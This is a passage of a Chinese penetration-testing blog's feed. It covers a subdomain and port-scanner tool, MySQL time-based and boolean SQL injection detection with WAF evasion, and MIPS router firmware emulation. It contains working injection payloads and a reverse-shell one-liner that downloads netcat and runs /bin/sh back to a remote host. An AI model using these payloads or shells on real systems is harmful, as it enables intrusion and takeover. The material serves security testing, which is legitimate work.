href="https://chromium.googlesource.com/chromium/src/+/master/chrome/common/extensions/api/_features.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/master/chrome/common/extensions/api/_features.md</a><br><a href="http://blog.gclxry.com/chrome-extension-features/" target="_blank" rel="noopener">http://blog.gclxry.com/chrome-extension-features/</a><br><a href="https://www.anquanke.com/post/id/98917" target="_blank" rel="noopener">https://www.anquanke.com/post/id/98917</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年8月份的时候fc老板带我搞了一波浏览器扩展的问题，屯了一些思路想批量扫描一下 chrome 扩展商店里的热门扩展，一直拖着没动，今天发现被大佬做了。&lt;/p&gt;
&lt;p&gt;浏览器扩展的配置文件为&lt;code&gt;manifest.json&lt;/code&gt;，里面规定了扩展的权限和一些其他的属性。其中比较常见且重要的属性有&lt;code&gt;content_security_policy&lt;/code&gt;, &lt;code&gt;permissions&lt;/code&gt;, &lt;code&gt;content_scripts&lt;/code&gt;。&lt;code&gt;content_security_policy&lt;/code&gt;指明了扩展所遵循的CSP规则，&lt;code&gt;permissions&lt;/code&gt;代表扩展所拥有的访问权限，&lt;code&gt;content_scripts&lt;/code&gt;则是会插入到页面中的脚本。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>子域名收集及端口扫描之ZeroScan</title>
    <link href="http://5alt.me/2018/01/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B9%8BZeroScan/"/>
    <id>http://5alt.me/2018/01/子域名收集及端口扫描之ZeroScan/</id>
    <published>2018-01-29T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>为了自动化日常的一些渗透测试任务，做了一个前期信息收集的轮子。<a href="https://github.com/5alt/ZeroScan" target="_blank" rel="noopener">ZeroScan</a> 主要分为子域名收集和端口扫描两个部分。这样，只需要输入目标域名，就能输出一个子域名以及对应ip端口扫描的报告。</p><p>子域名收集部分主要采用了主动扫描和被动 DNS 数据查询两种方式。被动 DNS 数据查询主要从 virustotal 和 dnsdb 上获取数据。此外还从 DuckDuckSearch、<a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">Google透明度报告</a> 以及 crt.sh 上收集子域名的信息。主动扫描采用了 lijiejie 的 <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a>。对于设置了泛解析的域名会进行一次过滤操作。<br><a id="more"></a><br>dnsdb 的数据无法主动获取，需要用户自己查询并下载 json 格式放在 input 目录下。DuckDuckSearch 的结果也可以自己写入。</p><p>子域名收集完毕后进行一次检测，主要为了判断改域名是否是CNAME指向另一个域名，是否指向CDN，是否指向内网IP。实际上，一般而言如果一个域名存在CNAME记录并且指向另外一个域名的话，该域名有很大的概率指向CDN。对于指向CDN的域名和指向内网的域名，不做后续的端口扫描。</p><p>目前常用的端口扫描方式为尝试建立一个 socket 连接，如果超时活错误则认为该端口未开启。为了提高效率，这里采用了 zmap 的扫描方式，在root权限下分两个进程一个发送扫描包，一个接收结果并过滤和保存。采用 scapy 库可以很简单的实现。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># send.py</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dst_ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">dst_port = (<span class="number">1</span>, <span class="number">60000</span>)</span><br><span class="line"></span><br><span class="line">send(IP(dst=dst_ip)/TCP(dport=dst_port,flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># recv.py</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">whitelist = [<span class="string">'127.0.0.1'</span>]</span><br><span class="line"></span><br><span class="line">f=<span class="string">"tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack != 0"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line"><span class="comment">#pkt.show()</span></span><br><span class="line"><span class="keyword">if</span> pkt[IP].src <span class="keyword">in</span> whitelist:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%s:%s"</span>%(pkt[IP].src, pkt[TCP].sport)</span><br><span class="line"></span><br><span class="line">sniff(prn=callback, filter=f, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>有时候这种扫描方式会产生一些遗漏，在这里对没有端口返回的ip进行二次扫描。</p><p>在获取端口信息之后，会进行一次粗略的服务识别。对于一些常见的端口，内置了一份端口和服务的对应关系表，直接查询即可获取。对没有对应关系的端口，会发生一些探测流量，根据响应来判断服务类型。这里抄袭了A牛的<a href="https://github.com/AnthraX1/InsightScan" target="_blank" rel="noopener">InsightScan</a>里的代码。如果还没有识别，那么就从nmap的<a href="https://github.com/nmap/nmap/blob/master/nmap-services" target="_blank" rel="noopener">nmap-services</a>列表去查询。</p><p>最后会根据结果输出一份 html 的报告，一些中间结果会在 output 文件夹里保存。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/AnthraX1/InsightScan" target="_blank" rel="noopener">https://github.com/AnthraX1/InsightScan</a><br><a href="http://biot.com/capstats/bpf.html" target="_blank" rel="noopener">http://biot.com/capstats/bpf.html</a><br><a href="http://www.freebuf.com/sectool/94507.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/94507.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了自动化日常的一些渗透测试任务，做了一个前期信息收集的轮子。&lt;a href=&quot;https://github.com/5alt/ZeroScan&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ZeroScan&lt;/a&gt; 主要分为子域名收集和端口扫描两个部分。这样，只需要输入目标域名，就能输出一个子域名以及对应ip端口扫描的报告。&lt;/p&gt;
&lt;p&gt;子域名收集部分主要采用了主动扫描和被动 DNS 数据查询两种方式。被动 DNS 数据查询主要从 virustotal 和 dnsdb 上获取数据。此外还从 DuckDuckSearch、&lt;a href=&quot;https://github.com/We5ter/GSDF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Google透明度报告&lt;/a&gt; 以及 crt.sh 上收集子域名的信息。主动扫描采用了 lijiejie 的 &lt;a href=&quot;https://github.com/lijiejie/subDomainsBrute&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;subDomainsBrute&lt;/a&gt;。对于设置了泛解析的域名会进行一次过滤操作。&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://5alt.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL注入检测</title>
    <link href="http://5alt.me/2018/01/MySQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/"/>
    <id>http://5alt.me/2018/01/MySQL注入检测/</id>
    <published>2018-01-10T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.784Z</updated>
    
    <content type="html"><![CDATA[<p>SQL 注入主要分两类，一类输入是字符型的，另一类输入是整数型的。在实际情况中，测试的站点可能存在waf，同时为了减少报警，尽量发送少的请求。为了达到这个效果，需要合理的规划发送的请求，而不是把payload一股脑的打出去。</p><p>一般来说，目标的输入可能是数字，可能是个字符串。输入是数字的时候对应查询的sql语句也可能以字符串的方式进行查询。</p><p>检测注入的流程可以根据测试的结果剪枝。基本流程为先检测报错注入，再测试基于时间的注入。一般来讲，如果有waf的话，基于时间的注入会被拦截。如果没有延时的话，说明要么不在运算语句中，要么被waf拦截了，要么不存在注入。接下来根据请求的stable情况以及原始请求是否为空，进行bool型注入判断以及其他位置的注入判断。<br><a id="more"></a></p><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>延时注入能适用于输入作为值情况下的注入检测，在页面无明显报错的时候优先使用延时注入的方式进行检测。<br>延时注入一般有sleep和benchmark两种方式，这两种方式都能产生延时的效果，但是仍然有所差异。</p><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><p>sleep函数执行成功之后返回数字0。<br>在 and 语句中，只要有其中一个条件为假，sleep就不会执行。从实际的观察来看，sleep在各条件中的执行优先级最低。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 and sleep(1);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| 1 and sleep(1) |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">|              0 |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">1.07</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="number">1</span>);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| 0 and sleep(1) |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">|              0 |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">0</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">1.07</span> sec)</span><br></pre></td></tr></table></figure></p><p>在 or 语句中，sleep的执行次数与当前列数相同，因为根据查询条件，每一列都会比较一次。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| count(*) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        9 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">1</span>);</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">9.67</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">id</span>=<span class="number">0</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">9.63</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">9.51</span> sec)</span><br></pre></td></tr></table></figure><p>为了防止 or 语句中的多次延时，可以使用 (select 1 from (select sleep(5))x) 的方式来避免执行多次。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 from users where id=1 or (select 1 from (select sleep(5))x);</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">9 rows in <span class="keyword">set</span> (<span class="number">5.07</span> sec)</span><br></pre></td></tr></table></figure></p><h3 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h3><p>benchmark的sleep的延时表现有所差异。<br>在 and 语句中，单纯select的时候是不会延时的，而在where语句中则会延时，即使部分条件明显为假。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 and benchmark(10000000,null);</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">| 1 and benchmark(10000000,null) |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">|                              0 |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.17</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="literal">null</span>);</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">| 0 and benchmark(10000000,null) |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">|                              0 |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="literal">null</span>) <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">2.17</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="literal">null</span>) <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">0</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">2.15</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="literal">null</span>) <span class="keyword">and</span> <span class="number">0</span>=<span class="number">1</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">2.15</span> sec)</span><br></pre></td></tr></table></figure><p>在 or 语句中，不会根据列数而多次延时。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 from users where benchmark(10000000,null) or id=0;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">2.22</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="literal">null</span>) <span class="keyword">or</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.18</span> sec)</span><br></pre></td></tr></table></figure></p><p>从上面可以看到，benchmark比sleep更加好用一些。但是benchmark无法精确的控制延时的时间。</p><h3 id="INSERT-中的延时"><a href="#INSERT-中的延时" class="headerlink" title="INSERT 中的延时"></a>INSERT 中的延时</h3><p>在INSERT注入中，需要让延时语句参与运算。<br>对于预期为字符串类型的输入，如果直接用加减或者逻辑与或等操作，很可能会导致语句出错。可以考虑用数字类型的字符串，利用mysql的类型转换功能进行操作，或者用适用于字符串的操作如<code>like</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users(username, isadmin)values('a'-sleep(1), 1);</span><br><span class="line">ERROR 1292 (22007): Truncated incorrect DOUBLE value: 'a'</span><br><span class="line"></span><br><span class="line">mysql&gt;  insert into users(username, isadmin)values('a' and sleep(1)='', 1);</span><br><span class="line">ERROR 1292 (22007): Truncated incorrect DOUBLE value: 'a'</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into users(username, isadmin)values('1'-sleep(1)-'1', 1);</span><br><span class="line">Query OK, 1 row affected (1.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into users(username, isadmin)values('aaa' like sleep(1)='', 1);</span><br><span class="line">Query OK, 1 row affected (1.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users where username='aa' like benchmark(10000000,null);</span><br><span class="line">+<span class="comment">-----------------------+---------+----+</span></span><br><span class="line">| username              | isadmin | id |</span><br><span class="line">+<span class="comment">-----------------------+---------+----+</span></span><br><span class="line">| Herp Derper           |       1 |  1 |</span><br><span class="line">| SlapdeBack LovedeFace |       1 |  2 |</span><br><span class="line">| Wengdack Slobdegoob   |       0 |  3 |</span><br><span class="line">| Chunk MacRunfast      |       0 |  4 |</span><br><span class="line">| Peter Weiner          |       0 |  5 |</span><br><span class="line">| aaa                   |       0 |  6 |</span><br><span class="line">| 0                     |       0 |  8 |</span><br><span class="line">| 0                     |       1 |  9 |</span><br><span class="line">+<span class="comment">-----------------------+---------+----+</span></span><br><span class="line">8 rows in <span class="keyword">set</span>, <span class="number">6</span> <span class="keyword">warnings</span> (<span class="number">3.82</span> sec)</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在测试延时注入的时候，尽量选择用benchmark函数。对字符类型的输入，用like语句进行延时判断，对数字类型的语句可以选择逻辑运算或者加减运算。</p><p>延时注入这一步可以检测出没有waf情况下的运算语句处的注入。经过这一步，后续只需要检测存在waf的情况下注入检测以及其他位置注入检测这两种情况。</p><h2 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h2><p>在测试完延时注入之后，用bool注入来检测存在waf的情况下运算语句位置的注入。</p><h3 id="检测请求是否stable"><a href="#检测请求是否stable" class="headerlink" title="检测请求是否stable"></a>检测请求是否stable</h3><p>响应中可能包含一些与时间有关的数据，以及类似 csrftoken 之类的hash，为了防止对判断的干扰，需要去掉这类的字符串。此外，用户的输入也可能回显在页面中，有的时候也需要将输入去除。<br>sqlmap 的方式是采用<code>difflib.SequenceMatcher</code>计算相同的比率，根据比率来判断网页是否相同。<br>AWVS 中是采用正则去除可能的时间戳，然后根据输入的长度来去除响应中的输入。<br>这两种方式都存在一些问题。在返回内容较短的情况下（如 ajax请求），计算比率会出现较大的误差。而AWVS的方式采用了写死的正则，不能保证去除所有的变化的内容。并且某些输入可能是一个常见的单词，强行替换可能会影响后续的响应比较。</p><p>最终还是选择采用 AWVS 的方式并做了一些优化。（其实可以在替换之后再计算相同的比率？）</p><h3 id="检测原始请求是否为空"><a href="#检测原始请求是否为空" class="headerlink" title="检测原始请求是否为空"></a>检测原始请求是否为空</h3><p>在原始请求从数据库获取数据为空的时候，就很难通过 bool 型注入进行注入点的判断。</p><h3 id="检测请求为空时响应是否和出错时相同"><a href="#检测请求为空时响应是否和出错时相同" class="headerlink" title="检测请求为空时响应是否和出错时相同"></a>检测请求为空时响应是否和出错时相同</h3><p>在不同的情况下可以通过一些简单的运算以及强制类型转换的性质来判断出是否存在注入。</p><h2 id="其他位置注入"><a href="#其他位置注入" class="headerlink" title="其他位置注入"></a>其他位置注入</h2><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在请求为空时采用延时注入判断，在有waf的情况下加注释符判断。</p><h3 id="order-by-group-by-asc-desc-注入"><a href="#order-by-group-by-asc-desc-注入" class="headerlink" title="order by/group by/asc/desc 注入"></a>order by/group by/asc/desc 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by username,1</span><br><span class="line">order by username asc,1  正确</span><br><span class="line">order by username asc,999 错误</span><br></pre></td></tr></table></figure><p>最后附个脑图 <a href="/downloads/MySQL注入检测.png">MySQL注入检测</a> 。</p><p>感谢雨大佬的指导~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL 注入主要分两类，一类输入是字符型的，另一类输入是整数型的。在实际情况中，测试的站点可能存在waf，同时为了减少报警，尽量发送少的请求。为了达到这个效果，需要合理的规划发送的请求，而不是把payload一股脑的打出去。&lt;/p&gt;
&lt;p&gt;一般来说，目标的输入可能是数字，可能是个字符串。输入是数字的时候对应查询的sql语句也可能以字符串的方式进行查询。&lt;/p&gt;
&lt;p&gt;检测注入的流程可以根据测试的结果剪枝。基本流程为先检测报错注入，再测试基于时间的注入。一般来讲，如果有waf的话，基于时间的注入会被拦截。如果没有延时的话，说明要么不在运算语句中，要么被waf拦截了，要么不存在注入。接下来根据请求的stable情况以及原始请求是否为空，进行bool型注入判断以及其他位置的注入判断。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>qemu、iptables和交叉编译</title>
    <link href="http://5alt.me/2018/01/qemu%E3%80%81iptables%E5%92%8C%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    <id>http://5alt.me/2018/01/qemu、iptables和交叉编译/</id>
    <published>2018-01-07T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>用binwalk分离文件然后用对应的文件系统解包工具解开。</p><p>osx上可以使用 <a href="https://github.com/cinquemb/firmware-mod-kit-osx" target="_blank" rel="noopener">https://github.com/cinquemb/firmware-mod-kit-osx</a><br><a id="more"></a></p><h2 id="qemu-模拟执行"><a href="#qemu-模拟执行" class="headerlink" title="qemu 模拟执行"></a>qemu 模拟执行</h2><p>安装<code>qemu-user-static</code>即可在<code>x86</code>的机器上执行mips的二进制文件。<br>加载库的路径是绝对路径，要么需要chroot来执行，要么需要把库拷到对应路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">salt@salt:cp $(<span class="built_in">which</span> qemu-mipsel) .</span><br><span class="line">salt@salt:~/rootfs$ sudo chroot . ./qemu-mips-static ./bin/busybox wget</span><br><span class="line">BusyBox vv1.9.1 (2016-09-01 16:26:57 CST) multi-call binary</span><br><span class="line"></span><br><span class="line">Usage: wget [OPTION]... HOST</span><br><span class="line"></span><br><span class="line">wget download and upload a file via HTTP</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-g    Download</span><br><span class="line"><span class="_">-s</span>    Upload</span><br><span class="line">-v    Verbose</span><br><span class="line">-u    Username to be used</span><br><span class="line">-p    Password to be used</span><br><span class="line"><span class="_">-l</span>    Local file path</span><br><span class="line">-r    Remote file path</span><br><span class="line">-P    Port to be used, optional</span><br><span class="line">-B    Bind <span class="built_in">local</span> ip, optional</span><br><span class="line">-A    Remote resolved ip, optional</span><br><span class="line">-b    Transfer start position</span><br><span class="line"><span class="_">-e</span>    Transfer length</span><br><span class="line">-m    Max transfer size</span><br><span class="line">-c    Compress downloaded file</span><br></pre></td></tr></table></figure><p>可以看到，在这个busybox里的wget和在普通Linux下的wget是不同的。<br>反弹shell <code>/bin/busybox wget -g 192.168.2.2 -l /tmp/nc -r /netcat; chmod 777 /tmp/nc;/tmp/nc 192.168.2.2 9988 -e /bin/sh</code></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://wiki.debian.org/QemuUserEmulation" target="_blank" rel="noopener">https://wiki.debian.org/QemuUserEmulation</a></li><li><a href="https://github.com/multiarch/qemu-user-static" target="_blank" rel="noopener">https://github.com/multiarch/qemu-user-static</a></li><li><a href="https://github.com/darkerego/mips-binaries" target="_blank" rel="noopener">https://github.com/darkerego/mips-binaries</a></li><li><a href="https://w00tsec.blogspot.jp/2013/09/analyzing-and-running-binaries-from.html" target="_blank" rel="noopener">https://w00tsec.blogspot.jp/2013/09/analyzing-and-running-binaries-from.html</a></li></ul><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>以下大部分内容引用自 <a href="https://www.zybuluo.com/yiltoncent/note/82203" target="_blank" rel="noopener">https://www.zybuluo.com/yiltoncent/note/82203</a></p><p>在路由器命令执行的时候可以考虑用<code>iptables</code>命令劫持经过此路由器的流量。</p><p>iptables的结构为<code>iptables-&gt;Tables-&gt;Chains-&gt;Rules</code>。<br>iptables具有Filter、NAT、Mangle、Raw四种内建表，每种表里有不同的链。如果不指定-t选项，默认就是filter表。</p><h3 id="filter表"><a href="#filter表" class="headerlink" title="filter表"></a>filter表</h3><p>Filter表示iptables的默认表，它具有三种内建链：</p><p>INPUT链 - 处理来自外部的数据。<br>OUTPUT链 - 